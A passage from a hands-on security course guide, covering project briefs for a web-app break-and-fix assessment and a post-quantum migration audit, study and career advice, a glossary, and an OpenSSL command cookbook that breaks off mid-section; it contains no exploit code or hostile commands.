   Remediation: specific, with a code sketch and the relevant OWASP
     cheat-sheet link
   References: CWE id, OWASP, any CVE
   Retest: (filled in Phase 4)

   Plus: an executive summary (5 sentences, no jargon), a findings table,
   and a methodology/scope statement.
```

### Phase 3 — Fix (in code)

Pick **at least 5 findings spanning ≥4 categories** and fix them properly in the
source:

```
   Injection      -> parameterised queries / exec-array / sandboxed
                     template; NOT input filtering as the primary control.
   XSS            -> context-aware output encoding / framework autoescape +
                     a strict nonce CSP; DOMPurify for rich text.
   Access control -> ownership in the query; centralised authz guard;
                     field allowlist DTO; 404 not 403.
   Auth/JWT       -> pin alg, verify aud/iss/exp, rotate session on login,
                     Secure/HttpOnly/SameSite cookie.
   CSRF/SSRF      -> synchronizer token + SameSite; allowlist + post-
                     resolution IP check + no redirects.
   Crypto         -> Argon2id; TLS enforced; move the secret server-side.
   Misconfig      -> add the headers; remove the debug route; fix the error
                     handler; update the component.

   For each fix: write a TEST (unit or integration) that FAILS against the
   vulnerable code and PASSES after the fix. This is your regression proof.
```

### Phase 4 — Re-test

Re-run each original exploit against the patched build. Fill in the "Retest"
field: *Fixed / Partially fixed / Not fixed*, with evidence. Note any fix that
broke functionality.

### Deliverable

`~/sec-lab/projects/p3-breakfix/` with: `report.md` (the full assessment),
`fixes/` (the patched source or a diff/patch set), `tests/` (the regression
tests), and `retest.md`.

### Definition of done

- [ ] ≥12 findings across ≥6 OWASP categories, each with reproducible evidence.
- [ ] A report a stranger could act on: exec summary, findings table, CVSS,
      root cause, remediation, references.
- [ ] ≥5 findings fixed in code across ≥4 categories, using the *correct*
      control (not a filter/WAF band-aid).
- [ ] A failing-then-passing test for every fix.
- [ ] Re-test documented; no fix silently broke the app.

### Rubric (/100)

```
   Coverage & correctness of findings ......... 25
   Evidence quality (reproducible, clear) .... 15
   Report professionalism (structure, CVSS,
     exec summary, remediation) .............. 20
   Fixes use the right control ............... 25
   Regression tests prove closure ........... 10
   Re-test rigour ........................... 5
```

### Further reading

- **Course:** PortSwigger Web Security Academy (do the tracks for any class you
  struggled with); the OWASP Juice Shop companion guide `pwning.owasp-juice.shop`.
- **Standard:** OWASP Web Security Testing Guide (WSTG); OWASP Application
  Security Verification Standard (ASVS) — use ASVS L1/L2 as your checklist.
- **Reporting:** the PTES "Reporting" section; public pentest report templates
  (Cure53, NCC Group, TrailofBits publish real ones — study their structure).
- **Scoring:** FIRST.org CVSS v3.1 (and v4.0) specification + calculator; MITRE
  CWE.
- **Book:** *Real-World Bug Hunting*, Peter Yaworski.

---

## Chapter 56 — Project 4: a post-quantum readiness audit

### Brief

Produce the deliverable a real organisation needs to start its PQC migration
(Part 6): a complete cryptographic inventory of SecureShop, a risk-ranked
migration plan, and a working proof-of-concept of hybrid key exchange plus a
crypto-agile signature path.

### Phase 1 — Cryptographic inventory

```
   Enumerate EVERY use of cryptography across SecureShop:
     - TLS: every endpoint (shop, admin, orders-api, DB, monitoring,
       webhooks out). Protocol, cipher, KEX group, cert key type/size,
       signature alg. (openssl s_client / testssl.sh / sslyze in a loop.)
     - SSH: host + user key types; Kex/Ciphers/MACs. (ssh-audit.)
     - Application: JWT alg; password hash; any AES/RSA/ECDH in code;
       token generation; HMAC usage. (grep + dependency review.)
     - At rest: DB/disk/backup encryption; how keys are wrapped (KMS?).
     - Secrets manager: its own transit + storage crypto.
     - Supply chain: artifact signing (your Ch 22 tool), image signing,
       package signature verification.
     - Third parties: payment gateway, email, CDN -- what do their APIs
       use, and do you pin anything?

   For each row record: component | algorithm | key size/params | key
   location | who can rotate it | data confidentiality lifetime |
   HNDL-sensitive? (does 2035 disclosure matter?) | quantum-vulnerable?
   (RSA/DH/ECC = yes; AES-256/SHA-384 = no) | crypto-agile? (algorithm in
   config vs hard-coded).
```

### Phase 2 — Risk ranking and migration plan

```
   Prioritise by  (secrecy-lifetime) x (exposure) x (difficulty-to-change).
   Produce a phased plan mapping to Ch 25's playbook:

     Phase 0  inventory (Phase 1 above) -- done
     Phase 1  confirm symmetric/hash are already PQ-safe (AES-256,
              SHA-384+) -- list any that aren't
     Phase 2  crypto-agility gaps: every place an algorithm is hard-coded,
              every stored blob without an algo/version tag, every key
              store without an abstraction -> concrete tickets
     Phase 3  enable hybrid KEX (X25519MLKEM768) on TLS endpoints,
              starting with the HNDL-sensitive customer path; measure
              handshake size/latency/CPU and any middlebox breakage
     Phase 4  PQ signatures: plan ML-DSA-65 for artifact/image signing
              (hybrid with Ed25519 first); SLH-DSA for anything with a
              decade-plus verifier lifetime (none in SecureShop unless you
              added the IoT scanners -- if so, prioritise)
     Phase 5  deprecate classical-only per NIST IR 8547 dates (2030/2035)

   For each item: owner, dependency (library/CA/vendor), effort, target
   quarter, and the risk if deferred.
```

### Phase 3 — Proof of concept

```
   1. HYBRID TLS: stand up shop.securesh.op with OpenSSL 3.5+ (or a
      Caddy/nginx build that supports it) negotiating X25519MLKEM768.
      Prove it with `openssl s_client -groups X25519MLKEM768` and a
      packet capture showing the larger ClientHello. Benchmark vs X25519
      (handshakes/sec, bytes on the wire, p50/p99 latency).

   2. HYBRID SSH: confirm `mlkem768x25519-sha256` (or
      `sntrup761x25519-sha512`) is negotiated between two modern OpenSSH
      endpoints; pin it in sshd_config; show the negotiated kex in `ssh -v`.

   3. CRYPTO-AGILE SIGNING: extend the Ch 22/26 release tool so the
      manifest carries `sig_alg` and supports ed25519, ml-dsa-65, and
      hybrid-ed25519-mldsa65. Demonstrate a migration: sign a release
      ed25519-only, then re-sign as hybrid; show an old verifier still
      accepts the ed25519 sig while a new verifier requires both.
      Tabulate key/sig sizes and sign/verify timings.

   4. ML-KEM by hand: one `openssl pkeyutl -encap/-decap` round trip,
      HKDF the shared secret to an AES-256 key, encrypt a file with it.
```

### Deliverable

`~/sec-lab/projects/p4-pq-audit/` with: `inventory.csv` (or a table in
`report.md`), `migration-plan.md` (phased, owned, dated), the PoC configs and
scripts, benchmark numbers, and an executive summary a non-cryptographer manager
can act on.

### Definition of done

- [ ] Inventory covers TLS, SSH, app-layer, at-rest, secrets, and supply-chain
      crypto — nothing hand-waved as "probably fine".
- [ ] Every row is classified quantum-vulnerable / PQ-safe and HNDL-sensitive /
      not, with a one-line justification.
- [ ] The plan is risk-ranked by the stated formula, phased per Chapter 25, and
      every item has an owner and a target.
- [ ] Working hybrid TLS **and** hybrid SSH, proven with `s_client`/`ssh -v` and
      a capture, with benchmarks vs classical.
- [ ] The release tool signs and verifies ed25519, ML-DSA-65, and hybrid, with a
      demonstrated migration path.
- [ ] An executive summary that states the actual business risk (what data,
      decrypted when, matters) in plain language.

### Rubric (/100)

```
   Inventory completeness & accuracy ......... 30
   Correct quantum-vuln / HNDL classification  15
   Risk-ranked, phased, owned migration plan . 20
   Working hybrid TLS + SSH with evidence .... 15
   Crypto-agile signing PoC + migration demo . 15
   Executive summary (plain-language risk) ... 5
```

### Further reading

- **Reports:** NIST IR 8547 (transition); NIST SP 1800-38 (NCCoE PQC migration
  practice guide, with enterprise scenarios); the NSA/CISA/NIST
  "Quantum-Readiness: Migration to PQC" fact sheet.
- **Deployment:** Cloudflare's yearly "state of the post-quantum internet";
  AWS "post-quantum" hub; the OpenSSH release notes for `mlkem768x25519`.
- **Tools:** `testssl.sh`, `sslyze`, `ssh-audit`, Open Quantum Safe
  `oqs-provider`, `test.openquantumsafe.org` for interop.
- **Specs:** `draft-ietf-tls-hybrid-design`; FIPS 203/204/205.
- **Book:** *Serious Cryptography* (2nd ed.), Ch. 14.

---

### End of Part 12 — Milestone check

- [ ] **Project 1 done:** a real two-tier CA, enforced profiles, working mTLS,
      revocation, automated renewal — graded ≥ 80/100.
- [ ] **Project 2 done:** a host hardened with measured before/after, egress
      control, a locked-down container, off-host logging — graded ≥ 80/100.
- [ ] **Project 3 done:** a professional assessment report and ≥ 5 real fixes
      with regression tests — graded ≥ 80/100.
- [ ] **Project 4 done:** a full crypto inventory, an owned migration plan, and
      working hybrid TLS + SSH + agile signing — graded ≥ 80/100.
- [ ] All four reports are in `~/sec-lab/projects/*/report.md` and readable by
      someone who wasn't there.

---

# Part 13 — Where to go next

## Chapter 57 — Honest gaps, and a six-month plan

### What this guide did not cover (by design)

This is an applied foundation. It deliberately skipped or skimmed:

```
   * BINARY EXPLOITATION       stack/heap overflows, ROP, use-after-free,
                               ASLR/DEP/CFI, exploit dev. A huge field.
                               -> pwn.college, "Nightmare", ropemporium.com,
                                  Azeria's ARM series.
   * REVERSE ENGINEERING       Ghidra/IDA/Binary Ninja, malware analysis,
                               obfuscation. -> "Practical Malware Analysis",
                               malwareunicorn.org, crackmes.one.
   * MOBILE (deep)             iOS/Android internals, Frida, obf, keystore.
                               -> OWASP MASTG/MASVS.
   * CLOUD & KUBERNETES (deep) IAM privilege-escalation graphs, EKS/GKE/AKS
                               attack paths, IMDS, serverless. -> "Hacking
                               Kubernetes", flaws.cloud, pwnedlabs.io,
                               Kubernetes CTF (kubectl), CNCF security.
   * DETECTION ENGINEERING     beyond Ch 50: EDR internals, threat hunting,
                               DFIR at scale. -> "Applied Network Security
                               Monitoring", SANS FOR508/FOR572.
   * HARDWARE / EMBEDDED / RF   side channels, glitching, JTAG, car/IoT,
                               SDR. -> "The Hardware Hacking Handbook".
   * CRYPTOGRAPHIC ENGINEERING implementing primitives, constant-time
                               code, formal verification. -> cryptopals.com,
                               "Real-World Cryptography" (Wong).
   * FORMAL METHODS, PROTOCOL   Tamarin/ProVerif, fuzzing at scale
     VERIFICATION, FUZZING      (AFL++, libFuzzer, OSS-Fuzz).
   * GOVERNANCE / RISK / COMPLIANCE  SOC 2, ISO 27001, PCI-DSS depth,
                               risk quantification (FAIR), security
                               programme management.
   * SOCIAL ENGINEERING / PHYSICAL, OSINT, red-team tradecraft, purple
     teaming, adversary emulation at depth.
   * AI/ML SECURITY            prompt injection, model/data poisoning,
                               extraction, agent security. -> OWASP LLM Top
                               10; and the companion AI guide if you have it.
```

Knowing these exist — and roughly what they involve — is itself useful.

### A six-month plan (part-time, ~6–8 h/week)

```
   MONTH 1 -- Cement the foundation
     - Redo any Part's milestone checklist you can't pass cold.
     - PortSwigger Academy: finish Access Control, SQLi, XSS, CSRF, SSRF,
       Auth, JWT tracks. Aim to solve labs without hints.
     - Read: "Serious Cryptography" (2nd ed.), Parts I-II.

   MONTH 2 -- Breadth: attacker skills
     - TryHackMe "Jr Penetration Tester" or "Web Fundamentals" path, or
       HackTheBox "Starting Point" + 6 easy boxes.
     - Learn one intercepting proxy deeply (Burp): Repeater, Intruder,
       extensions, macros.
     - Read: "The Web Application Hacker's Handbook" (method chapters).

   MONTH 3 -- Depth: pick ONE track
     - Web/appsec:  ASVS L2 review of a real app; OWASP WSTG end to end.
     - Cloud:       "Hacking Kubernetes" + flaws.cloud + pwnedlabs.io;
                    build & attack a small EKS/GKE cluster.
     - Detection:   build a home SOC (Security Onion / Elastic), run
                    Atomic Red Team, write Sigma rules, measure MTTD.
     - Crypto eng:  cryptopals sets 1-6.

   MONTH 4 -- Build something defensive and real
     - Contribute a security fix or a detection rule to an open-source
       project. Add SBOM + signing + a supply-chain gate (Ch 47) to a
       repo you own. Write it up publicly.

   MONTH 5 -- Practice under pressure
     - Play 3-4 CTFs (pick beginner-friendly: picoCTF archives, CSAW,
       HTB CTF). Focus on your Month-3 track's categories.
     - Do a full mock engagement on a vulnerable target: scope -> test ->
       report -> retest, timeboxed to a week.

   MONTH 6 -- Consolidate and aim
     - Take (or seriously prep for) one certification that matches your
       track (Ch 58).
     - Write 3-5 blog posts on what you learned -- teaching exposes the
       gaps. Start a lab notebook / GitHub of your tools.
     - Set the next six months' goal based on what you actually enjoyed.
```

### Habits that compound

```
   [ ] Read one primary source a week (an RFC, a spec section, a real
       post-mortem, a CVE writeup) -- not just blog summaries.
   [ ] Keep a lab. Break things you're about to build.
   [ ] When you use a library for crypto/auth/authz, read HOW it works
       once.
   [ ] Follow a few signal sources (Ch 58), skip the noise.
   [ ] Threat-model your own features (Ch 52) as a reflex.
   [ ] Teach: answer questions, write notes, give a brown-bag talk.
   [ ] Report responsibly. If you find a real bug in the wild: stop,
       don't dig, disclose via security.txt / a bug-bounty channel
       (Chapter 0.6).
```

### Further reading

- **Curricula:** OWASP "Security Champions" guide; the "Cyber Skills" roadmaps on
  roadmap.sh (`roadmap.sh/cyber-security`); SANS "Cyber Security Skills Roadmap".
- **Practice platforms:** PortSwigger Web Security Academy, HackTheBox,
  TryHackMe, pwn.college, pwnedlabs.io, CryptoHack, picoCTF, OverTheWire.
- **Books to grow into:** *The Tangled Web* (Zalewski), *Real-World Cryptography*
  (Wong), *Practical Malware Analysis*, *Hacking Kubernetes*, *Designing Secure
  Software* (Kohnfelder), *Alice and Bob Learn Application Security* (Tanya
  Janca).

---

## Chapter 58 — Specialisations, certifications, and staying current

### The main specialisations

```
   APPLICATION SECURITY / PRODUCT SECURITY
     secure SDLC, code review, threat modeling, SAST/DAST/SCA, paved-road
     tooling, working alongside dev teams. (This guide points here.)

   OFFENSIVE / PENETRATION TESTING / RED TEAM
     web/network/cloud/mobile pentest, red-team ops, adversary emulation.
     Report-writing and scoping are half the job.

   DETECTION & RESPONSE (BLUE TEAM) / SOC / DFIR
     detection engineering, threat hunting, incident response, forensics,
     threat intel.

   CLOUD / INFRASTRUCTURE / PLATFORM SECURITY
     IAM, network architecture, Kubernetes, IaC scanning, secrets, CSPM,
     guardrails at scale.

   SECURITY ENGINEERING / DevSecOps
     build the security tooling and pipelines; automation-first.

   CRYPTOGRAPHY / SECURITY RESEARCH
     protocol design, implementation, vuln research, exploit dev. Deep,
     specialised, often research-degree adjacent.

   GRC / SECURITY MANAGEMENT / PRIVACY
     risk, compliance (SOC2/ISO/PCI), policy, audits, programme leadership,
     privacy engineering.

   PRODUCT/SPECIFIC: OT/ICS, automotive, medical device, hardware, AI/ML
     security, blockchain.
```

Most careers move fluidly between these. A strong foundation (this guide) plus
one deep track plus general breadth is the durable shape.

### Certifications — what they're actually for

They're signalling and structured study, not proof of skill. Useful when
job-hunting or when an employer pays. Roughly by track:

```
   ENTRY / FOUNDATION
     CompTIA Security+           broad baseline; common HR filter
     ISC2 CC (Certified in
       Cybersecurity)            free-ish, foundational
     Google Cybersecurity Cert   beginner, blue-leaning

   OFFENSIVE / PENTEST
     PNPT (TCM)                  practical, affordable, report-based
     OSCP (OffSec)               the well-known hands-on bar; hard; network-
                                 focused. OSWE = code-centric web; OSEP =
                                 evasion/AD.
     HTB CPTS / CBBH             practical, modern, cheaper than OSCP
     PortSwigger BSCP            web-specific, practical, well-regarded

   DEFENSE / DFIR / DETECTION
     BTL1 / BTL2 (Blue Team
       Labs)                     practical blue-team
     GIAC GCIH, GCIA, GCFA,
       GNFA, GREM                SANS courses; excellent, expensive
     Elastic / Splunk certs      tool-specific

   CLOUD
     the cloud provider's
       security specialty        (AWS Security Specialty, Google PCA-
                                 Security, AZ-500)
     GIAC GCSA (cloud sec
       automation)

   MANAGEMENT / GRC / GENERAL
     CISSP (ISC2)                broad, management-leaning; the classic
                                 "senior" HR checkbox; needs experience
     CISM / CISA (ISACA)         management / audit
     ISO 27001 Lead Implementer/
       Auditor

   CRYPTO / RESEARCH
     mostly no certs -- portfolio, CVEs, CTF results, publications,
     conference talks are the currency.
```

**Advice:** if you're job-hunting entry-level, `Security+` or `CC` clears
filters; then one *practical* cert in your chosen track (PNPT/OSCP/BSCP/BTL/cloud
specialty). Skip collecting certs for their own sake. A public portfolio — the
projects from Part 12, blog posts, CTF profiles, OSS contributions — often
outweighs another acronym.

### Staying current (signal, not noise)

```
   FOUNDATIONS DON'T CHANGE FAST. The Top 10 classes, crypto primitives,
   TLS/SSH, auth, network attacks -- stable for years. Don't chase every
   headline.

   WORTH FOLLOWING:
     - Your dependencies' security advisories + a CVE feed scoped to your
       stack (GitHub Advisory DB, OSV, distro security lists).
     - 2-4 high-signal blogs: Project Zero, Trail of Bits, PortSwigger
       Research, tl;dr sec (newsletter), Google/Cloudflare/AWS security
       blogs, Krebs (industry), Schneier (policy/broad).
     - One newsletter: "tl;dr sec" or "Risky Business" (podcast).
     - Primary sources when something big lands: the actual advisory,
       RFC, or NIST doc -- not the third-hand summary.
     - One conference's talks per year (real-world track): DEF CON,
       Black Hat, OWASP Global AppSec, USENIX Security/Enigma, fwd:cloudsec,
       BSides (local + free).
     - Standards you touch: watch the relevant IETF WG, NIST project, or
       CA/Browser Forum for changes (e.g. cert lifetime shrinking, PQC).

   CADENCE: ~30 min/week skimming feeds; deep-dive only what affects you
   or genuinely interests you. Quarterly, re-read one chapter of this
   guide's further-reading list.
```

### A closing note

You started at "what is a byte" and finished by threat-modeling a system,
running a PKI, hardening a host, breaking and fixing an app, and planning a
post-quantum migration. That's the real job: not memorising attacks, but being
able to reason from fundamentals — *where is the trust boundary, what crosses it,
what happens when this fails* — and to build, test, and explain the controls.

Keep a lab. Read primary sources. Break your own things before someone else
does. Write down what you learn. And use it to defend, and to help others — the
whole point of Chapter 0.6.

### Further reading

- **Career:** "How to Build a Cybersecurity Career" (Daniel Miessler); the
  "Blue Team / Red Team / AppSec" roadmaps on `roadmap.sh`; Tanya Janca's
  *Alice and Bob Learn* series and community.
- **Cert prep:** OffSec, TCM Security, HTB Academy, PortSwigger, SANS course
  catalogues; r/cybersecurity and r/netsecstudents wikis for candid reviews.
- **Newsletters/feeds:** tl;dr sec, Risky Business, "Detection Engineering
  Weekly", "Last Week in AWS" (security bits), the OWASP and IETF mailing lists
  for your area.
- **Communities:** a local OWASP chapter, a local BSides, DEF CON groups, the
  many topic Discords/Slacks (appsec, DFIR, cloud security).

---

### End of Part 13 — Milestone check

- [ ] I know the major gaps in this guide and where to go for each
- [ ] I have a concrete six-month plan with a chosen depth track
- [ ] I have set up 2-4 high-signal information sources and a weekly cadence
- [ ] I have a public portfolio started (Part 12 projects + notes/writeups)
- [ ] I can explain, to a new engineer, how to reason about a system's security
      from fundamentals

---

## Continue the series

**Next, step 3b (Security: in depth): [Security Engineering in Depth](real-life-security-guide-v1.md).** It covers cloud and Kubernetes security, distributed authorization, advanced web attacks, data protection, detection. Hands-on: 10 Go labs + a `govulncheck` exercise ([§0.8](real-life-security-guide-v1.md#0-8-the-go-labs-security-mechanisms-you-can-run)).

---

# Appendix A — Glossary (plain language)

Short, practical definitions. Where a term has a precise technical meaning that
differs from loose usage, the loose usage is flagged.

```
AEAD          Authenticated Encryption with Associated Data. Encryption that
             also detects tampering, in one operation. AES-GCM, ChaCha20-
             Poly1305. Use this for new encryption. (Ch 15)
AES          Advanced Encryption Standard. The default symmetric block
             cipher. 128-bit blocks; 128/192/256-bit keys. (Ch 13)
ACME         Automated Certificate Management Environment. The protocol
             behind Let's Encrypt; automates issuing/renewing TLS certs. (Ch 30)
ARP          Address Resolution Protocol. Maps IP to MAC on a LAN. No
             authentication -> ARP spoofing. (Ch 37)
Argon2id     The recommended password-hashing function. Deliberately slow
             and memory-hard. (Ch 10)
Attack surface  Every point where an attacker can try to get in or get data
             out. Shrink it. (Ch 2)
Authentication (authn)  Proving WHO you are. (Ch 3)
Authorization (authz)   Deciding WHAT you may do. Checked on every request. (Ch 3, 45)
Base64       An encoding that re-expresses bytes using 64 safe characters.
             Reversible by anyone. NOT encryption. (Ch 6)
Bastion / jump host  A hardened gateway you connect through to reach
             internal systems. Use ProxyJump, not agent forwarding. (Ch 35)
BOLA / IDOR  Broken Object-Level Authorization / Insecure Direct Object
             Reference. Accessing another user's object by changing an id. (Ch 45)
CA           Certificate Authority. Signs certificates vouching that a
             public key belongs to a name. (Ch 29, 30)
CIA triad    Confidentiality, Integrity, Availability. The three things
             security protects. (Ch 1)
CSP          Content Security Policy. A response header that restricts what
             a page can load/run; mitigates XSS. (Ch 43)
CSPRNG       Cryptographically Secure Pseudo-Random Number Generator. Use
             this for keys, tokens, salts, nonces. (Ch 12, 46)
CSRF         Cross-Site Request Forgery. A malicious site causes the user's
             browser to make a state-changing request with their cookies. (Ch 44)
CT           Certificate Transparency. Public append-only logs of every
             issued certificate; makes mis-issuance detectable. (Ch 30)
DANE         DNS-based Authentication of Named Entities. TLSA records pin a
             server's cert via DNSSEC. Common for SMTP. (Ch 38)
Defense in depth  Multiple independent controls, so one failure isn't fatal. (Ch 1)
DH / DHE / ECDHE  Diffie-Hellman key exchange / ephemeral / elliptic-curve
             ephemeral. Agree a shared secret over a hostile network.
             "E" = forward secrecy. (Ch 18, 20)
DNSSEC       Signs DNS records so resolvers can verify authenticity.
             Does NOT encrypt. (Ch 38)
DoH / DoT    DNS over HTTPS / over TLS. Encrypts DNS queries in transit.
             Does NOT authenticate the data (that's DNSSEC). (Ch 38)
ECC          Elliptic Curve Cryptography. Same security as RSA with much
             smaller keys. (Ch 20)
ECDSA / EdDSA  Elliptic-curve signature schemes. ECDSA needs a safe random
             k per signature (footgun); Ed25519 is deterministic. (Ch 20, 21)
Encoding     Changing data's representation for safe transport. Fully
             reversible, no key, NO security. (Ch 6)
Fail closed / open  On error, deny (closed) or allow (open). Choose per
             context; security controls usually fail closed. (Ch 3)
Forward secrecy (PFS)  Compromising a long-term key later does not decrypt
             past sessions, because session keys were ephemeral. (Ch 18)
Grover's algorithm  Quantum search; halves the effective strength of
             symmetric crypto/hashes. Fix: double the size (AES-256). (Ch 23)
Hash         One-way fixed-size fingerprint of data. SHA-256. Not
             reversible, not encryption. (Ch 8)
HMAC         Keyed hash proving integrity + authenticity between two
             parties who share a key. (Ch 11)
HNDL         "Harvest now, decrypt later." Recording encrypted traffic
             today to decrypt with a future quantum computer. (Ch 23)
HSTS         HTTP Strict Transport Security. Header forcing HTTPS and
             blocking cert-error click-through. (Ch 31)
Hybrid (crypto)  Combining classical + post-quantum (e.g. X25519MLKEM768)
             so it's secure if either holds. (Ch 25)
IDOR         See BOLA. (Ch 45)
IV / nonce   Initialisation Vector / number-used-once. Randomiser for a
             cipher mode. Must never repeat with the same key. (Ch 14, 15)
JWT          JSON Web Token. Signed (not encrypted) claims. Payload is
             readable by anyone. Many footguns. (Ch 6, 46)
KDF          Key Derivation Function. Turns a shared secret or password
             into uniformly-random key material. HKDF, PBKDF2, Argon2. (Ch 18, 22)
KEM          Key Encapsulation Mechanism. Like DH but asymmetric-shaped:
             encapsulate -> (secret, ciphertext); decapsulate -> secret.
             ML-KEM. (Ch 24)
Kerckhoffs's principle  The system stays secure even if everything but the
             key is public. Don't roll your own / rely on secret designs. (Ch 12)
Kill chain   The stages of an intrusion: recon -> initial access -> ... ->
             actions on objectives. (Ch 2)
Least privilege  Minimum access, for minimum time. (Ch 45, 52)
MAC          (1) Message Authentication Code (HMAC etc.) -- integrity tag.
             (2) Media Access Control address -- L2 hardware address.
             (3) Mandatory Access Control (SELinux/AppArmor). Context tells
             you which. (Ch 11, 37, 54)
MITM         Man-in-the-middle. Active on-path attacker who can read and
             modify traffic. (Ch 37)
ML-KEM / ML-DSA / SLH-DSA  NIST post-quantum standards (FIPS 203/204/205):
             key exchange / signatures / hash-based signatures. (Ch 24)
mTLS         Mutual TLS. Both client and server present certificates. (Ch 31)
Nonce        See IV. In ECDSA, the per-signature random k. (Ch 15, 20)
OAEP / PSS   Padding schemes for RSA encryption / RSA signatures. Required;
             "textbook RSA" without them is broken. (Ch 19)
OAuth 2.0    Delegated authorization ("let this app use my Calendar"). NOT
             authentication. (Ch 46)
OCSP         Online Certificate Status Protocol. Real-time revocation check.
             Weak in practice (soft-fail). (Ch 30)
OIDC         OpenID Connect. Identity layer on top of OAuth 2.0 -> "log in
             with Google". Adds the ID token. (Ch 46)
One-time pad  Provably unbreakable cipher; impractical (key as long as the
             message, never reused). (Ch 12)
Origin       scheme + host + port. The unit of browser isolation (SOP). (Ch 41)
PKCE         Proof Key for Code Exchange. Protects the OAuth authorization-
             code flow from interception. Use for ALL clients. (Ch 46)
PKI          Public Key Infrastructure. CAs, certificates, chains, trust
             stores, revocation, transparency. (Ch 30)
Post-quantum (PQC)  Cryptography that resists quantum attack; runs on
             ordinary computers. (Ch 23-26)
Preimage / collision resistance  Can't find an input for a given hash /
             can't find two inputs with the same hash. (Ch 8)
Rainbow table  Precomputed hash lookup table. Defeated by a unique salt. (Ch 10)
Replay attack  Re-sending a valid captured message. Defeat with nonces/
             timestamps inside the signed/authenticated data. (Ch 21, 28)
RSA          Public-key algorithm based on integer factoring. Still used;
             new systems prefer ECC. Broken by quantum (Shor). (Ch 19)
Salt         Random per-record value added before hashing a password. Not
             secret; prevents precomputation. (Ch 10)
SBOM         Software Bill of Materials. Inventory of every component in a
             build. (Ch 47)
Same-origin policy (SOP)  Script on origin A can't read data from origin B. (Ch 41)
SameSite     Cookie attribute controlling whether a cookie is sent on
             cross-site requests. Lax / Strict / None. (Ch 41, 44)
Shor's algorithm  Quantum algorithm that factors integers and computes
             discrete logs efficiently -> breaks RSA, DH, ECC. (Ch 23)
Side channel  Leaking secrets via timing, power, cache, EM, etc. rather
             than the algorithm. (Ch 11)
Signature (digital)  Private key signs, public key verifies. Adds non-
             repudiation over a MAC. (Ch 21)
SLSA         Supply-chain Levels for Software Artifacts. A framework for
             build/artifact integrity. (Ch 47)
SNI          Server Name Indication. The hostname in the TLS ClientHello.
             In the clear unless ECH is used. (Ch 27, 28)
SSRF         Server-Side Request Forgery. Making a server fetch attacker-
             chosen URLs -> cloud metadata theft, internal pivot. (Ch 44)
STRIDE       Threat-modeling prompt: Spoofing, Tampering, Repudiation,
             Information disclosure, Denial of service, Elevation of
             privilege. (Ch 52)
Symmetric / asymmetric  One shared key / a public+private key pair. (Ch 12, 17)
TOFU         Trust On First Use. Pin an identity on first contact (SSH
             known_hosts). Weak at that first moment. (Ch 34)
Trust boundary  Where data crosses between different levels of trust or
             different owners. Threats cluster here. (Ch 2, 52)
XSS          Cross-Site Scripting. Attacker's JavaScript runs in your
             site's origin in a victim's browser. (Ch 43)
Zero trust   No implicit trust from network location; authenticate and
             authorize every request per-resource. (Ch 39)
```

---

# Appendix B — The OpenSSL cookbook

Assumes **OpenSSL 3.x** (`openssl version` should say `OpenSSL 3.x`, not
`LibreSSL`). macOS: `brew install openssl@3` and put it first on `PATH` (Ch 0.4).

### Random data and passwords

```bash
openssl rand -hex 32                  # 256-bit value, hex
openssl rand -base64 32               # 256-bit value, base64
openssl rand -out key.bin 32          # raw bytes to file
openssl passwd -6 'plaintext'         # crypt() SHA-512 hash (for /etc/shadow)
```

### Hashing and HMAC

```bash
printf 'hello' | openssl dgst -sha256
openssl dgst -sha256 -r file          # coreutils-style output
openssl dgst -sha512 file
printf 'msg' | openssl dgst -sha256 -hmac 'secretkey'
openssl dgst -sha256 -mac HMAC -macopt hexkey:$(openssl rand -hex 32) file
openssl speed -evp sha256 sha512      # benchmark
```

### Base64 / hex

```bash
printf 'data' | openssl base64                 # encode
echo 'ZGF0YQ==' | openssl base64 -d            # decode
printf 'data' | openssl base64 -A              # no line wrapping
xxd -p file            # hex encode      | xxd -r -p   # hex decode
```

### Symmetric encryption (file, password-based)

```bash
# ENCRYPT -- ALWAYS include -pbkdf2 and a high -iter
openssl enc -aes-256-cbc -pbkdf2 -iter 600000 -salt -in f -out f.enc
# DECRYPT
openssl enc -d -aes-256-cbc -pbkdf2 -iter 600000 -in f.enc
# armoured (base64) output
openssl enc -aes-256-cbc -pbkdf2 -iter 600000 -salt -a -in f -out f.b64
# raw key + IV instead of a password
openssl enc -aes-256-cbc -K "$(openssl rand -hex 32)" -iv "$(openssl rand -hex 16)" -in f -out f.enc
```

> `openssl enc` cannot do authenticated (GCM) encryption properly — no tag
> handling. For real work use `age`, libsodium, or a language AEAD API.

### Key generation (OpenSSL 3.x: one command for all types)

```bash
openssl genpkey -algorithm RSA   -pkeyopt rsa_keygen_bits:2048 -out rsa.pem
openssl genpkey -algorithm RSA   -pkeyopt rsa_keygen_bits:4096 -out rsa4096.pem
openssl genpkey -algorithm EC    -pkeyopt ec_paramgen_curve:P-256 -out ec.pem
openssl genpkey -algorithm EC    -pkeyopt ec_paramgen_curve:P-384 -out ec384.pem
openssl genpkey -algorithm ed25519 -out ed.pem
openssl genpkey -algorithm x25519  -out x.pem
# post-quantum (OpenSSL 3.5+)
openssl genpkey -algorithm ML-KEM-768 -out mlkem.pem
openssl genpkey -algorithm ML-DSA-65  -out mldsa.pem
openssl genpkey -algorithm SLH-DSA-SHA2-128s -out slh.pem

openssl pkey -in rsa.pem -pubout -out rsa.pub       # derive public key
openssl pkey -in rsa.pem -aes-256-cbc -out rsa.enc.pem   # encrypt key at rest
openssl pkey -in rsa.pem -text -noout               # inspect
```

### Sign and verify

```bash
# RSA-PSS
openssl dgst -sha256 -sign rsa.pem -sigopt rsa_padding_mode:pss -out f.sig f
openssl dgst -sha256 -verify rsa.pub -sigopt rsa_padding_mode:pss -signature f.sig f
# ECDSA
openssl dgst -sha256 -sign ec.pem -out f.sig f
openssl dgst -sha256 -verify ec.pub -signature f.sig f
# Ed25519 / ML-DSA / SLH-DSA -- sign the raw message, no -dgst
openssl pkeyutl -sign   -inkey ed.pem      -rawin -in f -out f.sig
openssl pkeyutl -verify -pubin -inkey ed.pub -rawin -in f -sigfile f.sig
```

### RSA encrypt a small blob (key transport)

```bash
openssl pkeyutl -encrypt -pubin -inkey rsa.pub -in aeskey.bin -out aeskey.enc \
  -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256
openssl pkeyutl -decrypt -inkey rsa.pem -in aeskey.enc -out aeskey.bin \
  -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256
```

### Key exchange (ECDH / X25519 / ML-KEM)

```bash
# X25519
openssl pkeyutl -derive -inkey mine.pem -peerkey theirs.pub -out shared.bin
# ML-KEM (OpenSSL 3.5+)
